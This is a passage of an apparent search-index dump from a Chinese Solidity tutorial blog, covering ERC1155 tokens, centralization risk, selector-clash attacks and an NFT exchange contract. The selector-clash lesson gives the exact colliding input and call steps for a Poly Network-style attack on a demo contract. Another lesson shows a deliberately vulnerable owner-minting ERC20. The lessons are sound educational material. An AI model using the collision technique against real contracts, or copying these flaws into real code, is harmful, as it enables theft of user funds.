TransferBatch事件：批量代币转账事件，在多币种转账时释放。 ApprovalForAll事件：批量授权事件，在批量授权时释放。 URI事件：元数据地址变更事件，在uri变化时释放。 ","date":"2022-09-07","objectID":"/posts/solidity-erc1155.html:2:1","tags":["solidity","basic"],"title":"GameFi中常见的ERC1155代币标准","uri":"/posts/solidity-erc1155.html"},{"categories":["基础知识","Solidity 应用"],"content":"IERC1155函数 balanceOf()：单币种余额查询，返回account拥有的id种类的代币的持仓量。 balanceOfBatch()：多币种余额查询，查询的地址accounts数组和代币种类ids数组的长度要相等。 setApprovalForAll()：批量授权，将调用者的代币授权给operator地址。。 isApprovedForAll()：查询批量授权信息，如果授权地址operator被account授权，则返回true。 safeTransferFrom()：安全单币转账，将amount单位id种类的代币从from地址转账给to地址。如果to地址是合约，则会验证是否实现了onERC1155Received()接收函数。 safeBatchTransferFrom()：安全多币转账，与单币转账类似，只不过转账数量amounts和代币种类ids变为数组，且长度相等。如果to地址是合约，则会验证是否实现了onERC1155BatchReceived()接收函数。 ","date":"2022-09-07","objectID":"/posts/solidity-erc1155.html:2:2","tags":["solidity","basic"],"title":"GameFi中常见的ERC1155代币标准","uri":"/posts/solidity-erc1155.html"},{"categories":["基础知识","Solidity 应用"],"content":"ERC1155接收合约 与ERC721标准类似，为了避免代币被转入黑洞合约，ERC1155要求代币接收合约继承IERC1155Receiver并实现两个接收函数： onERC1155Received()：单币转账接收函数，接受ERC1155安全转账safeTransferFrom 需要实现并返回自己的选择器0xf23a6e61。 onERC1155BatchReceived()：多币转账接收函数，接受ERC1155安全多币转账safeBatchTransferFrom 需要实现并返回自己的选择器0xbc197c81。 // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; import \"./IERC165.sol\"; /** * @dev ERC1155接收合约，要接受ERC1155的安全转账，需要实现这个合约 */ interface IERC1155Receiver is IERC165 { /** * @dev 接受ERC1155安全转账`safeTransferFrom` * 需要返回 0xf23a6e61 或 `bytes4(keccak256(\"onERC1155Received(address,address,uint256,uint256,bytes)\"))` */ function onERC1155Received( address operator, address from, uint256 id, uint256 value, bytes calldata data ) external returns (bytes4); /** * @dev 接受ERC1155批量安全转账`safeBatchTransferFrom` * 需要返回 0xbc197c81 或 `bytes4(keccak256(\"onERC1155BatchReceived(address,address,uint256[],uint256[],bytes)\"))` */ function onERC1155BatchReceived( address operator, address from, uint256[] calldata ids, uint256[] calldata values, bytes calldata data ) external returns (bytes4); } ","date":"2022-09-07","objectID":"/posts/solidity-erc1155.html:3:0","tags":["solidity","basic"],"title":"GameFi中常见的ERC1155代币标准","uri":"/posts/solidity-erc1155.html"},{"categories":["基础知识","Solidity 应用"],"content":"ERC1155主合约 ERC1155主合约实现了IERC1155接口合约规定的函数，还有单币/多币的铸造和销毁函数。 ","date":"2022-09-07","objectID":"/posts/solidity-erc1155.html:4:0","tags":["solidity","basic"],"title":"GameFi中常见的ERC1155代币标准","uri":"/posts/solidity-erc1155.html"},{"categories":["基础知识","Solidity 应用"],"content":"ERC1155变量 ERC1155主合约包含4个状态变量： name：代币名称 symbol：代币代号 _balances：代币持仓映射，记录代币种类id下某地址account的持仓量balances。 _operatorApprovals：批量授权映射，记录持有地址给另一个地址的授权情况。 ","date":"2022-09-07","objectID":"/posts/solidity-erc1155.html:4:1","tags":["solidity","basic"],"title":"GameFi中常见的ERC1155代币标准","uri":"/posts/solidity-erc1155.html"},{"categories":["基础知识","Solidity 应用"],"content":"ERC1155函数 ERC1155主合约包含16个函数： 构造函数：初始化状态变量name和symbol。 supportsInterface()：实现ERC165标准，声明它支持的接口，供其他合约检查。 balanceOf()：实现IERC1155的balanceOf()，查询持仓量。与ERC721标准不同，这里需要输入查询的持仓地址account以及币种id。 balanceOfBatch()：实现IERC1155的balanceOfBatch()，批量查询持仓量。 setApprovalForAll()：实现IERC1155的setApprovalForAll()，批量授权，释放ApprovalForAll事件。 isApprovedForAll()：实现IERC1155的isApprovedForAll()，查询批量授权信息。 safeTransferFrom()：实现IERC1155的safeTransferFrom()，单币种安全转账，释放TransferSingle事件。与ERC721不同，这里不仅需要填发出方from，接收方to，代币种类id，还需要填转账数额amount。 safeBatchTransferFrom()：实现IERC1155的safeBatchTransferFrom()，多币种安全转账，释放TransferBatch事件。 _mint()：单币种铸造函数。 _mintBatch()：多币种铸造函数。 _burn()：单币种销毁函数。 _burnBatch()：多币种销毁函数。 _doSafeTransferAcceptanceCheck：单币种转账的安全检查，被safeTransferFrom()调用，确保接收方为合约的情况下，实现了onERC1155Received()函数。 _doSafeBatchTransferAcceptanceCheck：多币种转账的安全检查，，被safeBatchTransferFrom调用，确保接收方为合约的情况下，实现了onERC1155BatchReceived()函数。 uri()：返回ERC1155的第id种代币存储元数据的网址，类似ERC721的tokenURI。 baseURI()：返回baseURI，uri就是把baseURI和id拼接在一起，需要开发重写。 // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; import \"./IERC1155.sol\"; import \"./IERC1155Receiver.sol\"; import \"./IERC1155MetadataURI.sol\"; import \"@openzeppelin/contracts/utils/Address.sol\"; import \"@openzeppelin/contracts/utils/String.sol\"; import \"./IERC165.sol\"; /** * @dev ERC1155多代币标准 * 见 https://eips.ethereum.org/EIPS/eip-1155 */ contract ERC1155 is IERC165, IERC1155, IERC1155MetadataURI { using Address for address; // 使用Address库，用isContract来判断地址是否为合约 using Strings for uint256; // 使用String库 // Token名称 string public name; // Token代号 string public symbol; // 代币种类id 到 账户account 到 余额balances 的映射 mapping(uint256 =\u003e mapping(address =\u003e uint256)) private _balances; // address 到 授权地址 的批量授权映射 mapping(address =\u003e mapping(address =\u003e bool)) private _operatorApprovals; /** * 构造函数，初始化`name` 和`symbol`, uri_ */ constructor(string memory name_, string memory symbol_) { name = name_; symbol = symbol_; } /** * @dev See {IERC165-supportsInterface}. */ function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) { return interfaceId == type(IERC1155).interfaceId || interfaceId == type(IERC1155MetadataURI).interfaceId || interfaceId == type(IERC165).interfaceId; } /** * @dev 持仓查询 实现IERC1155的balanceOf，返回account地址的id种类代币持仓量。 */ function balanceOf(address account, uint256 id) public view virtual override returns (uint256) { require(account != address(0), \"ERC1155: address zero is not a valid owner\"); return _balances[id][account]; } /** * @dev 批量持仓查询 * 要求: * - `accounts` 和 `ids` 数组长度相等. */ function balanceOfBatch(address[] memory accounts, uint256[] memory ids) public view virtual override returns (uint256[] memory) { require(accounts.length == ids.length, \"ERC1155: accounts and ids length mismatch\"); uint256[] memory batchBalances = new uint256[](accounts.length); for (uint256 i = 0; i \u003c accounts.length; ++i) { batchBalances[i] = balanceOf(accounts[i], ids[i]); } return batchBalances; } /** * @dev 批量授权，调用者授权operator使用其所有代币 * 释放{ApprovalForAll}事件 * 条件：msg.sender != operator */ function setApprovalForAll(address operator, bool approved) public virtual override { require(msg.sender != operator, \"ERC1155: setting approval status for self\"); _operatorApprovals[msg.sender][operator] = approved; emit ApprovalForAll(msg.sender, operator, approved); } /** * @dev 查询批量授权. */ function isApprovedForAll(address account, address operator) public view virtual override returns (bool) { return _operatorApprovals[account][operator]; } /** * @dev 安全转账，将`amount`单位的`id`种类代币从`from`转账到`to` * 释放 {TransferSingle} 事件. * 要求: * - to 不能是0地址. * - from拥有足够的持仓量，且调用者拥有授权 * - 如果 to 是智能合约, 他必须支持 IERC1155Receiver-onERC1155Received. */ function safeTransferFrom( address from, address to, uint256 id, uint256 amount, bytes memory data ) public virtual override { address operator = msg.sender; // 调用者是持有者或是被授权 require( from == operator || isApprovedForAll(from, operator), \"ERC1155: caller is not token owner nor approved\" ); require(to != address(0), \"ERC1155: transfer to the zero ","date":"2022-09-07","objectID":"/posts/solidity-erc1155.html:4:2","tags":["solidity","basic"],"title":"GameFi中常见的ERC1155代币标准","uri":"/posts/solidity-erc1155.html"},{"categories":["基础知识","Solidity 应用"],"content":"BAYC，但是ERC1155 我们魔改下ERC721标准的无聊猿BAYC，创建一个免费铸造的BAYC1155。我们修改_baseURI()函数，使得BAYC1155的uri和BAYC的tokenURI一样。这样，BAYC1155元数据会与无聊猿的相同： // SPDX-License-Identifier: MIT pragma solidity ^0.8.4; import \"./ERC1155.sol\"; contract BAYC1155 is ERC1155{ uint256 constant MAX_ID = 10000; // 构造函数 constructor() ERC1155(\"BAYC1155\", \"BAYC1155\"){ } //BAYC的baseURI为ipfs://QmeSjSinHpPnmXmspMjwiXyN6zS4E9zccariGR3jxcaWtq/ function _baseURI() internal pure override returns (string memory) { return \"ipfs://QmeSjSinHpPnmXmspMjwiXyN6zS4E9zccariGR3jxcaWtq/\"; } // 铸造函数 function mint(address to, uint256 id, uint256 amount) external { // id 不能超过10,000 require(id \u003c MAX_ID, \"id overflow\"); _mint(to, id, amount, \"\"); } // 批量铸造函数 function mintBatch(address to, uint256[] memory ids, uint256[] memory amounts) external { // id 不能超过10,000 for (uint256 i = 0; i \u003c ids.length; i++) { require(ids[i] \u003c MAX_ID, \"id overflow\"); } _mintBatch(to, ids, amounts, \"\"); } } ","date":"2022-09-07","objectID":"/posts/solidity-erc1155.html:5:0","tags":["solidity","basic"],"title":"GameFi中常见的ERC1155代币标准","uri":"/posts/solidity-erc1155.html"},{"categories":["基础知识","Solidity 应用"],"content":"Remix演示 ","date":"2022-09-07","objectID":"/posts/solidity-erc1155.html:6:0","tags":["solidity","basic"],"title":"GameFi中常见的ERC1155代币标准","uri":"/posts/solidity-erc1155.html"},{"categories":["基础知识","Solidity 应用"],"content":"1. 部署BAYC1155合约 ","date":"2022-09-07","objectID":"/posts/solidity-erc1155.html:6:1","tags":["solidity","basic"],"title":"GameFi中常见的ERC1155代币标准","uri":"/posts/solidity-erc1155.html"},{"categories":["基础知识","Solidity 应用"],"content":"2. 查看元数据uri ![](https://raw.githubusercontent.com/jollysone/Picture-Library/master/blog/202303032335544.png) ","date":"2022-09-07","objectID":"/posts/solidity-erc1155.html:6:2","tags":["solidity","basic"],"title":"GameFi中常见的ERC1155代币标准","uri":"/posts/solidity-erc1155.html"},{"categories":["基础知识","Solidity 应用"],"content":"3. mint并查看持仓变化 mint一栏中输入账户地址、id和数量，点击mint按钮铸造。若数量为1，则为非同质化代币；若数量大于1，则为同质化代币。 blanceOf一栏中输入账户地址和id查看对应持仓 ","date":"2022-09-07","objectID":"/posts/solidity-erc1155.html:6:3","tags":["solidity","basic"],"title":"GameFi中常见的ERC1155代币标准","uri":"/posts/solidity-erc1155.html"},{"categories":["基础知识","Solidity 应用"],"content":"4. 批量mint并查看持仓变化 mintBatch一栏中输入要铸造的ids数组以及对应的数量，两者数组的长度必须相等 将刚刚铸造好的代币id数组输入即可查看 ","date":"2022-09-07","objectID":"/posts/solidity-erc1155.html:6:4","tags":["solidity","basic"],"title":"GameFi中常见的ERC1155代币标准","uri":"/posts/solidity-erc1155.html"},{"categories":["基础知识","Solidity 应用"],"content":"5. 批量转账并查看持仓变化 与铸造类似，不过这次要从拥有相应代币的地址转到一个新的地址，这个地址可以是普通地址也可以是合约地址，如果是合约地址会验证是否实现了onERC1155Received()接收函数。 这里我们转给一个普通地址，输入ids和amounts数组。 对刚才转入的地址查看其持仓变化。 ","date":"2022-09-07","objectID":"/posts/solidity-erc1155.html:6:5","tags":["solidity","basic"],"title":"GameFi中常见的ERC1155代币标准","uri":"/posts/solidity-erc1155.html"},{"categories":["基础知识","Solidity 应用"],"content":"总结 以太坊EIP1155提出的ERC1155多代币标准，它允许一个合约中包含多个同质化或非同质化代币。并且，我们创建了魔改版无聊猿 - BAYC1155：一个包含10,000种代币且元数据与BAYC相同的ERC1155代币。目前，ERC1155主要应用于GameFi中。但随着元宇宙技术不断发展，这个标准估计会越来越流行。 ","date":"2022-09-07","objectID":"/posts/solidity-erc1155.html:7:0","tags":["solidity","basic"],"title":"GameFi中常见的ERC1155代币标准","uri":"/posts/solidity-erc1155.html"},{"categories":["合约安全"],"content":" 引言 智能合约中的中心化和伪去中心化所带来的风险。Ronin桥和Harmony桥因该漏洞被黑客攻击，分别被盗取了 6.24 亿美元和 1 亿美元。 ","date":"2022-09-04","objectID":"/posts/solidity-smart-contract-security-centralization.html:0:0","tags":["solidity","security","multi-sig","token-locker"],"title":"合约安全：中心化风险","uri":"/posts/solidity-smart-contract-security-centralization.html"},{"categories":["合约安全"],"content":"1 中心化风险 我们经常以Web3的去中心化为骄傲，认为在Web3.0世界里，所有权和控制权都是去中心化。但实际上，中心化是Web3项目最常见的风险之一。知名区块链审计公司Certik在2021年DeFi安全报告中指出： 中心化风险是 DeFi 中最常见的漏洞，2021年中有 44 次 DeFi 黑客攻击与它相关，造成用户资金损失超过 13 亿美元。这强调了权力下放的重要性，许多项目仍需努力实现这一目标。 中心化风险指智能合约的所有权是中心化的，例如合约的owner由一个地址控制，它可以随意修改合约参数，甚至提取用户资金。中心化的项目存在单点风险，可以被恶意开发者（内鬼）或黑客利用，只需要获取具有控制权限地址的私钥之后，就可以通过rug-pull，无限铸币，或其他类型方法盗取资金。 链游项目Vulcan Forged在2021年12月因私钥泄露被盗 1.4 亿美元，DeFi项目EasyFi在2021年4月因私钥泄露被盗 5900 万美元，DeFi项目bZx在钓鱼攻击中私钥泄露被盗 5500 万美元。 ","date":"2022-09-04","objectID":"/posts/solidity-smart-contract-security-centralization.html:1:0","tags":["solidity","security","multi-sig","token-locker"],"title":"合约安全：中心化风险","uri":"/posts/solidity-smart-contract-security-centralization.html"},{"categories":["合约安全"],"content":"2 伪去中心化风险 伪去中心化的项目通常对外鼓吹自己是去中心化的，但实际上和中心化项目一样存在单点风险。比如使用多签钱包来管理智能合约，但几个多签人是一致行动人，背后由一个人控制。这类项目由于包装的很去中心化，容易得到投资者信任，所以当黑客事件发生时，被盗金额也往往更大。 近两年爆火的链游项目 Axie 的 Ronin 链跨链桥项目在2022年3月被盗 6.24 亿美元，是历史上被盗金额最大的事件。Ronin 跨链桥由 9 个验证者维护，必须有 5 个人达成共识才能批准存款和提款交易。这看起来像多签一样，非常去中心化。但实际上其中 4 个验证者由 Axie 的开发公司 Sky Mavis 控制，而另 1 个由 Axie DAO 控制的验证者也批准了 Sky Mavis 验证节点代表他们签署交易。因此，在攻击者获取了 Sky Mavis 的私钥后（具体方法未披露），就可以控制 5 个验证节点，授权盗走了 173,600 ETH 和 2550 万USDC。 Harmony公链的跨链桥在2022年6月被盗 1 亿美元。Harmony桥由5 个多签人控制，很离谱的是只需其中 2 个人签名就可以批准一笔交易。在黑客设法盗取两个多签人的私钥后，将用户质押的资产盗空。 ","date":"2022-09-04","objectID":"/posts/solidity-smart-contract-security-centralization.html:2:0","tags":["solidity","security","multi-sig","token-locker"],"title":"合约安全：中心化风险","uri":"/posts/solidity-smart-contract-security-centralization.html"},{"categories":["合约安全"],"content":"3 漏洞合约复现 有中心化风险的合约多种多样，这里只举一个最常见的例子：owner地址可以任意铸造代币的ERC20合约。当项目内鬼或黑客取得owner的私钥后，可以无限铸币，造成投资人大量损失。 // SPDX-License-Identifier: MIT pragma solidity ^0.8.4; import \"@openzeppelin/contracts/token/ERC20/ERC20.sol\"; import \"@openzeppelin/contracts/access/Ownable.sol\"; contract Centralization is ERC20, Ownable { constructor() ERC20(\"Centralization\", \"Cent\") { address exposedAccount = 0xe16C1623c1AA7D919cd2241d8b36d9E79C1Be2A2; transferOwnership(exposedAccount); } function mint(address to, uint256 amount) external onlyOwner{ _mint(to, amount); } } ","date":"2022-09-04","objectID":"/posts/solidity-smart-contract-security-centralization.html:3:0","tags":["solidity","security","multi-sig","token-locker"],"title":"合约安全：中心化风险","uri":"/posts/solidity-smart-contract-security-centralization.html"},{"categories":["合约安全"],"content":"4 如何减少中心化/伪去中心化风险？ 使用多签钱包管理国库和控制合约参数。为了兼顾效率和去中心化，可以选择 4/7 或 6/9 多签。 多签的持有人要多样化，分散在创始团队、投资人、社区领袖之间，并且不要相互授权签名。 使用时间锁控制合约，在黑客或项目内鬼修改合约参数/盗取资产时，项目方和社区有一些时间来应对，将损失最小化。 ","date":"2022-09-04","objectID":"/posts/solidity-smart-contract-security-centralization.html:4:0","tags":["solidity","security","multi-sig","token-locker"],"title":"合约安全：中心化风险","uri":"/posts/solidity-smart-contract-security-centralization.html"},{"categories":["合约安全"],"content":"5 总结 中心化/伪去中心化是区块链项目最大的风险，近两年造成用户资金损失超过 20 亿美元。中心化风险通过分析合约代码就可以发现，而伪去中心化风险藏的更深，需要对项目进行细致的尽职调查才能发现。 ","date":"2022-09-04","objectID":"/posts/solidity-smart-contract-security-centralization.html:5:0","tags":["solidity","security","multi-sig","token-locker"],"title":"合约安全：中心化风险","uri":"/posts/solidity-smart-contract-security-centralization.html"},{"categories":["合约安全"],"content":" 引言 选择器碰撞攻击，它是导致跨链桥 Poly Network 被黑的原因之一。在2021年8月，Poly Network在ETH，BSC，和 Polygon 上的跨链桥合约被盗，损失高达6.11亿美元（总结）。这是2021年最大的区块链黑客事件，也是历史被盗金额榜单上第2名，仅次于 Ronin 桥黑客事件。 ","date":"2022-09-03","objectID":"/posts/solidity-smart-contract-security-selector-clash.html:0:0","tags":["solidity","security","selector","abi"],"title":"合约安全：选择器碰撞","uri":"/posts/solidity-smart-contract-security-selector-clash.html"},{"categories":["合约安全"],"content":"1 选择器碰撞 以太坊智能合约中，函数选择器是函数签名 \"\u003cfunction name\u003e(\u003cfunction input types\u003e)\" 的哈希值的前4个字节（8位十六进制）。当用户调用合约的函数时，calldata的前4字节就是目标函数的选择器。 由于函数选择器只有4字节，非常短，很容易被碰撞出来：即我们很容易找到两个不同的函数，但是他们有着相同的函数选择器。比如transferFrom(address,address,uint256)和gasprice_bit_ether(int128)有着相同的选择器：0x23b872dd。当然你也可以写个脚本暴力破解。 大家可以用这两个网站来查同一个选择器对应的不同函数： https://www.4byte.directory/ https://sig.eth.samczsun.com/ 你也可以使用下面的Power Clash工具进行暴力破解： PowerClash: https://github.com/AmazingAng/power-clash 相比之下，钱包的公钥有256字节，被碰撞出来的概率几乎为0，非常安全。 ","date":"2022-09-03","objectID":"/posts/solidity-smart-contract-security-selector-clash.html:1:0","tags":["solidity","security","selector","abi"],"title":"合约安全：选择器碰撞","uri":"/posts/solidity-smart-contract-security-selector-clash.html"},{"categories":["合约安全"],"content":"2 解决斯芬克斯之谜 以太坊的人得罪了天神，天神震怒。天后赫拉为了惩罚以太坊的人，在以太坊的峭崖上降下一个名叫斯芬克斯的人面狮身的女妖。她向每一个路过悬崖的以太坊用户提出一个谜语：“什么东西在早晨用四只脚走路，中午两只脚走路，晚间三只脚走路，在一切生物中这是唯一的用不同数目的脚走路的生物。脚最多的时候，正是速度和力量最小的时候。”对于这个奥妙费解的谜语，凡猜中者即可活命，凡猜不中者一律被吃掉。过路的人全被斯芬克斯吃了，以太坊用户陷入恐惧之中。斯芬克斯用选择器0x10cd2dc7来验证答案是否正确。 有一天上午，俄狄浦斯路过此地，会见了女妖，并猜中了这神秘奥妙之谜。他说：“这是\"function man()\"啊！在生命的早晨，他是个孩子，用两条腿和两只手爬行；到了生命的中午，他变成壮年，只用两条腿走路；到了生命的傍晚，他年老体衰，必须借助拐杖走路，所以被称为三只脚。”谜语被猜中后，俄狄浦斯得以生还。 那一天下午，路过此地，会见了女妖，并猜中了这神秘奥妙之谜。他说：“这是\"function peopleLduohW(uint256)\"啊！在生命的早晨，他是个孩子，用两条腿和两只手爬行；到了生命的中午，他变成壮年，只用两条腿走路；到了生命的傍晚，他年老体衰，必须借助拐杖走路，所以被称为三只脚。”谜语再次被猜中后，斯芬克斯气急败坏，脚下一打滑就从巍峨的峭崖上掉下去摔死了。 ","date":"2022-09-03","objectID":"/posts/solidity-smart-contract-security-selector-clash.html:2:0","tags":["solidity","security","selector","abi"],"title":"合约安全：选择器碰撞","uri":"/posts/solidity-smart-contract-security-selector-clash.html"},{"categories":["合约安全"],"content":"3 漏洞合约复现 ","date":"2022-09-03","objectID":"/posts/solidity-smart-contract-security-selector-clash.html:3:0","tags":["solidity","security","selector","abi"],"title":"合约安全：选择器碰撞","uri":"/posts/solidity-smart-contract-security-selector-clash.html"},{"categories":["合约安全"],"content":"3.1 漏洞合约 下面我们来看一下有漏洞的合约例子。SelectorClash合约有1个状态变量 solved，初始化为false，攻击者需要将它改为true。合约主要有2个函数，函数名沿用自 Poly Network 漏洞合约。 putCurEpochConPubKeyBytes() ：攻击者调用这个函数后，就可以将solved改为true，完成攻击。但是这个函数检查msg.sender == address(this)，因此调用者必须为合约本身，我们需要看下其他函数。 executeCrossChainTx() ：通过它可以调用合约内的函数，但是函数参数的类型和目标函数不太一样：目标函数的参数为(bytes)，而这里调用的函数参数为(bytes,bytes,uint64)。 contract SelectorClash { bool public solved; // 攻击是否成功 // 攻击者需要调用这个函数，但是调用者 msg.sender 必须是本合约。 function putCurEpochConPubKeyBytes(bytes memory _bytes) public { require(msg.sender == address(this), \"Not Owner\"); solved = true; } // 有漏洞，攻击者可以通过改变 _method 变量碰撞函数选择器，调用目标函数并完成攻击。 function executeCrossChainTx( bytes memory _method, bytes memory _bytes, bytes memory _bytes1, uint64 _num ) public returns (bool success){ (success, ) = address(this).call(abi.encodePacked(bytes4(keccak256(abi.encodePacked(_method, \"(bytes,bytes,uint64)\"))), abi.encode(_bytes, _bytes1, _num))); } } ","date":"2022-09-03","objectID":"/posts/solidity-smart-contract-security-selector-clash.html:3:1","tags":["solidity","security","selector","abi"],"title":"合约安全：选择器碰撞","uri":"/posts/solidity-smart-contract-security-selector-clash.html"},{"categories":["合约安全"],"content":"3.2 攻击方法 我们的目标是利用executeCrossChainTx()函数调用合约中的putCurEpochConPubKeyBytes()，目标函数的选择器为：0x41973cd9。观察到executeCrossChainTx()中是利用_method参数和\"(bytes,bytes,uint64)\"作为函数签名计算的选择器。因此，我们只需要选择恰当的_method，让这里算出的选择器等于0x41973cd9，通过选择器碰撞调用目标函数。 Poly Network黑客事件中，黑客碰撞出的_method为 f1121318093，即f1121318093(bytes,bytes,uint64)的哈希前4位也是0x41973cd9，可以成功的调用函数。接下来我们要做的就是将f1121318093转换为bytes类型：0x6631313231333138303933，然后作为参数输入到executeCrossChainTx()中。executeCrossChainTx()函数另3个参数不重要，填 0x, 0x, 0 就可以。 ","date":"2022-09-03","objectID":"/posts/solidity-smart-contract-security-selector-clash.html:3:2","tags":["solidity","security","selector","abi"],"title":"合约安全：选择器碰撞","uri":"/posts/solidity-smart-contract-security-selector-clash.html"},{"categories":["合约安全"],"content":"3.3 Remix演示 部署SelectorClash合约。 调用executeCrossChainTx()，参数填0x6631313231333138303933，0x，0x，0，发起攻击。 查看solved变量的值，被修改为ture，攻击成功。 ","date":"2022-09-03","objectID":"/posts/solidity-smart-contract-security-selector-clash.html:3:3","tags":["solidity","security","selector","abi"],"title":"合约安全：选择器碰撞","uri":"/posts/solidity-smart-contract-security-selector-clash.html"},{"categories":["合约安全"],"content":"4 总结 介绍了选择器碰撞攻击，它是导致跨链桥 Poly Network 被黑 6.1 亿美金的的原因之一。这个攻击告诉了我们： 函数选择器很容易被碰撞，即使改变参数类型，依然能构造出具有相同选择器的函数。 管理好合约函数的权限，确保拥有特殊权限的合约的函数不能被用户调用。 ","date":"2022-09-03","objectID":"/posts/solidity-smart-contract-security-selector-clash.html:4:0","tags":["solidity","security","selector","abi"],"title":"合约安全：选择器碰撞","uri":"/posts/solidity-smart-contract-security-selector-clash.html"},{"categories":["基础知识","Solidity 应用"],"content":" 引言 Opensea是以太坊上最大的NFT交易平台，总交易总量达到了$300亿。Opensea在交易中抽成2.5%，因此它通过用户交易至少获利了$7.5亿。另外，它的运作并不去中心化，且不准备发币补偿用户。NFT玩家苦Opensea久已，今天我们就利用智能合约搭建一个零手续费的去中心化NFT交易所：NFTSwap。 ","date":"2022-08-27","objectID":"/posts/solidity-erc721-nft-swap.html:0:0","tags":["solidity","basic"],"title":"如何创建一个NFT交易所","uri":"/posts/solidity-erc721-nft-swap.html"},{"categories":["基础知识","Solidity 应用"],"content":"设计逻辑 卖家：出售NFT的一方，可以挂单list、撤单revoke、修改价格update。 买家：购买NFT的一方，可以购买purchase。 订单：卖家发布的NFT链上订单，一个系列的同一tokenId最多存在一个订单，其中包含挂单价格price和持有人owner信息。当一个订单交易完成或被撤单后，其中信息清零。 ","date":"2022-08-27","objectID":"/posts/solidity-erc721-nft-swap.html:1:0","tags":["solidity","basic"],"title":"如何创建一个NFT交易所","uri":"/posts/solidity-erc721-nft-swap.html"},{"categories":["基础知识","Solidity 应用"],"content":"NFTSwap合约 ","date":"2022-08-27","objectID":"/posts/solidity-erc721-nft-swap.html:2:0","tags":["solidity","basic"],"title":"如何创建一个NFT交易所","uri":"/posts/solidity-erc721-nft-swap.html"},{"categories":["基础知识","Solidity 应用"],"content":"事件 合约包含4个事件，对应挂单list、撤单revoke、修改价格update、购买purchase这四个行为： event List(address indexed seller, address indexed nftAddr, uint256 indexed tokenId, uint256 price); event Purchase(address indexed buyer, address indexed nftAddr, uint256 indexed tokenId, uint256 price); event Revoke(address indexed seller, address indexed nftAddr, uint256 indexed tokenId); event Update(address indexed seller, address indexed nftAddr, uint256 indexed tokenId, uint256 newPrice); ","date":"2022-08-27","objectID":"/posts/solidity-erc721-nft-swap.html:2:1","tags":["solidity","basic"],"title":"如何创建一个NFT交易所","uri":"/posts/solidity-erc721-nft-swap.html"},{"categories":["基础知识","Solidity 应用"],"content":"订单 NFT订单抽象为Order结构体，包含挂单价格price和持有人owner信息。nftList映射记录了订单是对应的NFT系列（合约地址）和tokenId信息。 // 定义order结构体 struct Order{ address owner; uint256 price; } // NFT Order映射 mapping(address =\u003e mapping(uint256 =\u003e Order)) public nftList; ","date":"2022-08-27","objectID":"/posts/solidity-erc721-nft-swap.html:2:2","tags":["solidity","basic"],"title":"如何创建一个NFT交易所","uri":"/posts/solidity-erc721-nft-swap.html"},{"categories":["基础知识","Solidity 应用"],"content":"回退函数 在NFTSwap中，用户使用ETH购买NFT。因此，合约需要实现fallback()函数来接收ETH。 fallback() external payable{} ","date":"2022-08-27","objectID":"/posts/solidity-erc721-nft-swap.html:2:3","tags":["solidity","basic"],"title":"如何创建一个NFT交易所","uri":"/posts/solidity-erc721-nft-swap.html"},{"categories":["基础知识","Solidity 应用"],"content":"onERC721Received ERC721的安全转账函数会检查接收合约是否实现了onERC721Received()函数，并返回正确的选择器selector。用户下单之后，需要将NFT发送给NFTSwap合约。因此NFTSwap继承IERC721Receiver接口，并实现onERC721Received()函数： contract NFTSwap is IERC721Receiver{ // 实现{IERC721Receiver}的onERC721Received，能够接收ERC721代币 function onERC721Received( address operator, address from, uint tokenId, bytes calldata data ) external override returns (bytes4){ return IERC721Receiver.onERC721Received.selector; } ","date":"2022-08-27","objectID":"/posts/solidity-erc721-nft-swap.html:2:4","tags":["solidity","basic"],"title":"如何创建一个NFT交易所","uri":"/posts/solidity-erc721-nft-swap.html"},{"categories":["基础知识","Solidity 应用"],"content":"交易 合约实现了4个交易相关的函数： 挂单list()：卖家创建NFT并创建订单，并释放List事件。参数为NFT合约地址_nftAddr，NFT对应的_tokenId，挂单价格_price（注意：单位是wei）。成功后，NFT会从卖家转到NFTSwap合约中。 // 挂单: 卖家上架NFT，合约地址为_nftAddr，tokenId为_tokenId，价格_price为以太坊（单位是wei） function list(address _nftAddr, uint256 _tokenId, uint256 _price) public{ IERC721 _nft = IERC721(_nftAddr); // 声明IERC721接口合约变量 require(_nft.getApproved(_tokenId) == address(this), \"Need Approval\"); // 合约得到授权 require(_price \u003e 0); // 价格大于0 Order storage _order = nftList[_nftAddr][_tokenId]; //设置NF持有人和价格 _order.owner = msg.sender; _order.price = _price; // 将NFT转账到合约 _nft.safeTransferFrom(msg.sender, address(this), _tokenId); // 释放List事件 emit List(msg.sender, _nftAddr, _tokenId, _price); } 撤单revoke()：卖家撤回挂单，并释放Revoke事件。参数为NFT合约地址_nftAddr，NFT对应的_tokenId。成功后，NFT会从NFTSwap合约转回卖家。 // 撤单： 卖家取消挂单 function revoke(address _nftAddr, uint256 _tokenId) public { Order storage _order = nftList[_nftAddr][_tokenId]; // 取得Order require(_order.owner == msg.sender, \"Not Owner\"); // 必须由持有人发起 // 声明IERC721接口合约变量 IERC721 _nft = IERC721(_nftAddr); require(_nft.ownerOf(_tokenId) == address(this), \"Invalid Order\"); // NFT在合约中 // 将NFT转给卖家 _nft.safeTransferFrom(address(this), msg.sender, _tokenId); delete nftList[_nftAddr][_tokenId]; // 删除order // 释放Revoke事件 emit Revoke(msg.sender, _nftAddr, _tokenId); } 修改价格update()：卖家修改NFT订单价格，并释放Update事件。参数为NFT合约地址_nftAddr，NFT对应的_tokenId，更新后的挂单价格_newPrice（注意：单位是wei）。 // 调整价格: 卖家调整挂单价格 function update(address _nftAddr, uint256 _tokenId, uint256 _newPrice) public { require(_newPrice \u003e 0, \"Invalid Price\"); // NFT价格大于0 Order storage _order = nftList[_nftAddr][_tokenId]; // 取得Order require(_order.owner == msg.sender, \"Not Owner\"); // 必须由持有人发起 // 声明IERC721接口合约变量 IERC721 _nft = IERC721(_nftAddr); require(_nft.ownerOf(_tokenId) == address(this), \"Invalid Order\"); // NFT在合约中 // 调整NFT价格 _order.price = _newPrice; // 释放Update事件 emit Update(msg.sender, _nftAddr, _tokenId, _newPrice); } 购买purchase：买家支付ETH购买挂单的NFT，并释放Purchase事件。参数为NFT合约地址_nftAddr，NFT对应的_tokenId。成功后，ETH将转给卖家，NFT将从NFTSwap合约转给买家。 // 购买: 买家购买NFT，合约为_nftAddr，tokenId为_tokenId，调用函数时要附带ETH function purchase(address _nftAddr, uint256 _tokenId) payable public { Order storage _order = nftList[_nftAddr][_tokenId]; // 取得Order require(_order.price \u003e 0, \"Invalid Price\"); // NFT价格大于0 require(msg.value \u003e= _order.price, \"Increase price\"); // 购买价格大于标价 // 